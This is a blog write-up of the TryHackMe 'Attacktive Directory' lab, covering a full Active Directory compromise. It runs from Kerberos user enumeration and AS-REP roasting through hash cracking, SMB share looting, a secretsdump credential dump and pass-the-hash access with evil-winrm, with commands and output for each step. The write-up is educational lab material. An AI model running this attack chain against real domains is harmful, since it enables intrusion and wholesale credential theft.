---
title: Attacktive Directory | THM
date: 2025-09-23 07:40:00 +0200
categories:
  - THM 
tags:
  - THM
  - AD
img_path: ""
image: https://i.pinimg.com/1200x/70/84/50/708450fc48c4153991fc9ff2af1a558e.jpg
---

السَّلَامُ عَلَيْكُمْ وَرَحْمَةُ اللَّهِ وَبَرَكَاتُهُ، بِسْمِ اللَّهِ، وَالصَّلَاةُ وَالسَّلَامُ عَلَى رَسُولِ اللَّهِ، الْحَمْدُ لِلَّهِ الَّذِي عَلَّمَ بِالْقَلَمِ، عَلَّمَ الإِنسَانَ مَا لَمْ يَعْلَمْ، وَالصَّلَاةُ وَالسَّلَامُ عَلَى خَيْرِ مُعَلِّمٍ النَّاسَ الْخَيْرَ، مُحَمَّدٍ صَلَّى اللَّهُ عَلَيْهِ وَسَلَّمَ، أَمَّا بَعْدُ

# Intro 

99% of Corporate networks run off Active Directory. From this machine you will have a basic understanding on how to exploit such an environment.

### Learning Objectives

- AD Enumeration
- Kerberos
- Cracking Hashes
- Impacket
### [Challenge](https://tryhackme.com/room/attacktivedirectory)


### Tools

- [HashCat](https://hashcat.net/hashcat/)  
- [Impacket](https://github.com/SecureAuthCorp/impacket)  
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)  
- [Kerbrute](https://github.com/ropnop/kerbrute)  
- [SMBClient](https://tldp.org/HOWTO/SMB-HOWTO-8.html)

#  Setup

###  get Impacket:

```bash
 git clone <https://github.com/SecureAuthCorp/impacket.git> /opt/impacket
```

### install pip for Python3

```bash
sudo apt install python3-pip
```

### install prereqs

```bash
pip3 install -r /opt/impacket/requirements.txt
```

### install impacket

```bash
cd /opt/impacket && sudo python3 ./setup.py install
```

### install bloodhound and neo4j

```bash
sudo apt install bloodhound neo4j
```


# Enumeration

```bash
nmap -sV -v 10.10.98.191 -A
```


Here we go the result :

```bash 
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:  
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos 
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Which tool do we use to enumerate port 139/445 (SMB)?

A well known tool to do so is **_enum4linux_** this was also hinted at in the brief xD: .


### Find out what the NetBIOS-Domain name is of the machine

To got this we must use `enum4linux`  so the command :

```bash 
enum4linux <Machine-ip>
```

So we got big output but we focus on `NetBIOS Domain Name`  

<img width="1895" height="845" alt="image" src="https://github.com/user-attachments/assets/fad57df5-735f-4b6f-8437-57959d10c9e5" />


### What invalid TLD do people commonly use for their Active Directory Domain?

AS we see in `namp` output we notes that Domain Name being `spookysec.local` 

```bash 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
```

So `.local` is often miss-used as a .TLD (Top Level Domain)



# Enumerating Users via Kerberos

First we will enumerate with this lists 

<img width="2030" height="623" alt="image" src="https://github.com/user-attachments/assets/8e976e3d-1386-470f-ba8a-d6ef5a539cb3" />



## How to enumerate valid users with `kerbrute`?

`Kerbrute` Tool has a parameter `userenum` to enumerate valid usernames, To enumerate valid usernames from the `userlist.txt` provided to us we run this  command:

```bash
kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt
```

Here we go , we got this output :  

```bash 
[👾]   )#  kerbrute userenum --dc 10.10.24.200 -d spookysec.local usrlst -t 100                                     [/root]

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 09/23/25 - Ronnie Flathers @ropnop

2025/09/23 09:13:00 >  Using KDC(s):
2025/09/23 09:13:00 >   10.10.24.200:88

2025/09/23 09:13:01 >  [+] VALID USERNAME:       james@spookysec.local
2025/09/23 09:13:02 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2025/09/23 09:13:03 >  [+] VALID USERNAME:       James@spookysec.local
2025/09/23 09:13:03 >  [+] VALID USERNAME:       robin@spookysec.local
2025/09/23 09:13:07 >  [+] VALID USERNAME:       darkstar@spookysec.local
2025/09/23 09:13:11 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/09/23 09:13:23 >  [+] VALID USERNAME:       backup@spookysec.local
2025/09/23 09:13:27 >  [+] VALID USERNAME:       paradox@spookysec.local
2025/09/23 09:13:44 >  [+] VALID USERNAME:       JAMES@spookysec.local
2025/09/23 09:13:49 >  [+] VALID USERNAME:       Robin@spookysec.local
2025/09/23 09:14:20 >  [+] VALID USERNAME:       Administrator@spookysec.local
2025/09/23 09:15:34 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2025/09/23 09:15:58 >  [+] VALID USERNAME:       Paradox@spookysec.local
2025/09/23 09:17:24 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2025/09/23 09:17:47 >  [+] VALID USERNAME:       ori@spookysec.local
2025/09/23 09:18:31 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2025/09/23 09:20:12 >  Done! Tested 73317 usernames (16 valid) in 431.760 seconds
```

We notes this accounts : 
- `svc-admin@spookysec.local`
- `backup@spookysec.local`
- `administrator@spookysec.local`


# Abusing Kerberos

we can attempt to abuse a feature with an attack method called ASRreproasting. This occurs when a user account has the privilege “Does not require Pre-Authentication” set. So the account in question **does not** need to provide valid identification before requesting a Kerberos Ticket.

So we'll use tool called `GetNpUsers`  from `Impacket`  that we can use to query ASReproastable accounts from the Key Distribution Center.

and  it's takes valid username from `Kerbrute`  output , So we'll run the following command :

Test backup username :
```bash
GetNPUsers spookysec.local/backup -no-pass -dc-ip <ip>
```

and i got this :

```bash 
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for backup
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

lets test it with  svc-admin: 

```bash 
GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip <ip>
```

And here we go we got this great output 

```bash 
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5dbf3fab08d44a414465862a7df602ca$b01ea118a95ae0c5479689cd138f9507b0bbf00ed4e4adbd7f47521566996703a5ec2021550040d732fb682e8c5f92aa911779fefb94cccf9b33fdd5d786bc3f1debffc6a04cdb85d2c7c7b631029dec8f0fd4d17619fa11e16d1feeac79bc4c0c7c2f71dbbbb85dab0ca67db56662a60caabeca1b64ff3841788f85245aba9ff902174d58f495be0b125a808489b384c1580adafaa69718c12b0605d6f161690b29574e426afcf8b737da61218ad84835d4eb274ed3b492d7de3c171fcb7fd1f1682c2c433cbd2cb95872607bd2b863c348b18be74cb51dd7ab2576fb054a50a93e8b73b6b9e15b97631f0395458dcf6152
```

Then we got a hash back! Looking at the [HashCat examples wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes), this appears to be Kerberos 5 AS-REP etype 23, which is mode 18200. We can save this full hash to a file and then specify the mode, hash and dictionary like  this command :

```bash
hashcat -m 18200 hash.txt passwordlist.txt
```

And we got this :

```bash
[👾]   )#  hashcat -m 18200 hash passwo                                                                             [/root]
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-14650HX, 2856/5776 MB (1024 MB allocatable), 24MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 6 MB

Dictionary cache built:
* Filename..: passwo
* Passwords.: 70188
* Bytes.....: 569236
* Keyspace..: 70188
* Runtime...: 0 secs

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5dbf3fab08d44a414465862a7df602ca$b01ea118a95ae0c5479689cd138f9507b0bbf00ed4e4adbd7f47521566996703a5ec2021550040d732fb682e8c5f92aa911779fefb94cccf9b33fdd5d786bc3f1debffc6a04cdb85d2c7c7b631029dec8f0fd4d17619fa11e16d1feeac79bc4c0c7c2f71dbbbb85dab0ca67db56662a60caabeca1b64ff3841788f85245aba9ff902174d58f495be0b125a808489b384c1580adafaa69718c12b0605d6f161690b29574e426afcf8b737da61218ad84835d4eb274ed3b492d7de3c171fcb7fd1f1682c2c433cbd2cb95872607bd2b863c348b18be74cb51dd7ab2576fb054a50a93e8b73b6b9e15b97631f0395458dcf6152:management2005

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5dbf3fab08d...cf6152
Time.Started.....: Tue Sep 23 09:32:18 2025 (0 secs)
Time.Estimated...: Tue Sep 23 09:32:18 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwo)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   225.9 kH/s (2.29ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12288/70188 (17.51%)
Rejected.........: 0/12288 (0.00%)
Restore.Point....: 0/70188 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: m123456 -> henrik
Hardware.Mon.#1..: Util:  4%

Started: Tue Sep 23 09:31:52 2025
Stopped: Tue Sep 23 09:32:20 2025
```

So from the `hashcat` output the password is `management2005` .


# Enumeration  – With Credentials

Now that we have credentials, we can try to enumerate shares and use the credentials to get more details back

so we'll run this command with `smbclient` tool :

```bash
smbclient -L <ip> -U svc-admin
```

Note : (- L for list of shares )

And we got this output :

```bash 
[👾]   )#  smbclient -L 10.10.24.200 -U svc-admin                                                                                                                                                        [/root]
Password for [WORKGROUP\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.24.200 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```


Next I started going down the list with `svc-admin`‘s credentials, we have access to the backup share, which we can access with this command :

```bash
smbclient \\\\<ip>\\backup -U svc-admin
```

And we got this :

```bash 
[👾]   )#  smbclient \\\\10.10.24.200\\backup -U svc-admin                                                                                                                                               [/root]
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Apr  4 21:08:39 2020
  ..                                  D        0  Sat Apr  4 21:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020

                8247551 blocks of size 4096. 3636231 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> ^Z
[5]  + 228797 suspended  smbclient \\\\10.10.24.200\\backup -U svc-admin
```

And when open the file we already got it from `smb`  connection we see that :

```bash 
[👾]   )#  cat backup_credentials.txt                                                                                                                                                                    [/root]
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

So lets try to decode with base64 with this command :

```bash
[👾]   )#  base64 -d backup_credentials.txt 
```

and we got this  credentials  :

```bash 
backup@spookysec.local:backup2517860 
```

# Elevating Privileges

With our new credentials, we could have elevated access. This backup account could be the backup for the entire Domain Controller that would allow all AD changes to be synced to this account, including password hashes. We can use a different `impacket` tool called `secretsdump.py`to retrieve all the password hashes we could have access with this command:

```bash
secretsdump.py -dc-ip <ip> -target-ip <ip> backup@spookysec.local
```

And here we go we got this :

```bash 

[👾]   )#  secretsdump.py -just-dc backup@10.10.24.200                                                                                                                                                   [/root]
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250919.210843.8426ec99', 'secretsdump.py')
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:b5b6437f2612905fdacd1dd9f55e2d3a:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:190460f347b3b4b9a4530704130a10e1962ca8c17e94a55062c83871a37aabb4
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:7968b73916c040e3a84e6e90d8e83c86
ATTACKTIVEDIREC$:des-cbc-md5:52b94abc70c27f79
```

Now we'll use  `evil-winrm` tool  with this command :

```bash
evil-winrm -i <ip> -u Administrator -H <hash>
```

Note: the hash is NT hash see this example :

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

The NET  hash is `0e0363213e37b94221497260b0bcb4fc` .

And after run command i discover the  Machine to found the flag and this is my process to found them :

#### Administrator Flag

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd Desktop
Cannot find path 'C:\Users\Administrator\Documents\Desktop' because it does not exist.
At line:1 char:1
+ cd Desktop
+ ~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Documents\Desktop:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
TryHackMe{Brahh go and try }
```


#### svc-admin flag

```bash
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/17/2020   4:04 PM                a-spooks
d-----        9/17/2020   4:02 PM                Administrator
d-----         4/4/2020  12:19 PM                backup
d-----         4/4/2020   1:07 PM                backup.THM-AD
d-r---         4/4/2020  11:19 AM                Public
d-----         4/4/2020  12:18 PM                svc-admin


*Evil-WinRM* PS C:\Users> cd svc-admin
*Evil-WinRM* PS C:\Users\svc-admin> dir


    Directory: C:\Users\svc-admin


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         4/4/2020  12:18 PM                3D Objects
d-r---         4/4/2020  12:18 PM                Contacts
d-r---         4/4/2020  12:18 PM                Desktop
d-r---         4/4/2020  12:18 PM                Documents
d-r---         4/4/2020  12:18 PM                Downloads
d-r---         4/4/2020  12:18 PM                Favorites
d-r---         4/4/2020  12:18 PM                Links
d-r---         4/4/2020  12:18 PM                Music
d-r---         4/4/2020  12:18 PM                Pictures
d-r---         4/4/2020  12:18 PM                Saved Games
d-r---         4/4/2020  12:18 PM                Searches
d-r---         4/4/2020  12:18 PM                Videos


*Evil-WinRM* PS C:\Users\svc-admin> cd Documents
*Evil-WinRM* PS C:\Users\svc-admin\Documents> dir
*Evil-WinRM* PS C:\Users\svc-admin\Documents> dir
*Evil-WinRM* PS C:\Users\svc-admin\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc-admin> cd Desktop
*Evil-WinRM* PS C:\Users\svc-admin\Desktop> dir


    Directory: C:\Users\svc-admin\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:18 PM             28 user.txt.txt


*Evil-WinRM* PS C:\Users\svc-admin\Desktop> cat user.txt.txt
TryHackMe{you stilll !!!!!!!!!}
```


#### backup flag 

```bash
*Evil-WinRM* PS C:\Users\svc-admin\Desktop> cd ..
*Evil-WinRM* PS C:\Users\svc-admin> cd ..
*Evil-WinRM* PS C:\Users> cd backup
*Evil-WinRM* PS C:\Users\backup> cd Desktop
*Evil-WinRM* PS C:\Users\backup\Desktop> dir


    Directory: C:\Users\backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  12:19 PM             26 PrivEsc.txt


*Evil-WinRM* PS C:\Users\backup\Desktop> cat PrivEsc.txt
TryHackMe{nahh hehe }
```

This machine was a great reminder that every small clue can lead to a bigger breakthrough. By following a structured approach — reconnaissance, exploitation, and privilege escalation — we managed to complete it step by step. Hopefully this write-up helps others facing the same challenge.


[<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/9a4c16cd-fe8d-4701-be12-ab7e86c4c866" />](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExeGx1OHZqNHJ6em53NHczdHhrN2JoY3k4NGZ3NG10bDFqcjczanJ6YiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/xYGnFm4mVcMxYIVq3v/giphy.gif)


